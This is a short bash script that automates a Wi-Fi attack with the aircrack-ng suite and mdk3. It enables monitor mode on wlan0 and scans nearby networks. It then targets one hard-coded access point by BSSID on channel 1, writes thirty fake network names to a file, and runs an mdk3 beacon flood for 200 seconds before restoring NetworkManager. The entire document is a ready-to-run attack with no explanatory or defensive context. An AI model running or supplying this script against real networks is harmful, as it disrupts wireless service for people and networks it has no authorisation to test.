#!/bin/bash

airmon-ng check kill > /dev/null 2>&1
airmon-ng start wlan0 > /dev/null 2>&1
airodump-ng wlan0mon > /dev/null 2>&1 &
var=$! ; sleep 15 ; kill -9 $var
airodump-ng -c 1 --bssid 00:23:04:B7:EF:D0 wlan0mon > /dev/null 2>&1 &
var=$! ; sleep 10 ; kill -9 $var
for i in $(seq 1 30) ; do echo "MiRed$i" >> redes ; done
mdk3 wlan0mon b -f redes -a -s 1000 -c 1 &
var=$! ; sleep 200 ; kill -9 $var
airmon-ng stop wlan0mon
systemctl enable NetworkManager
systemctl start NetworkManager

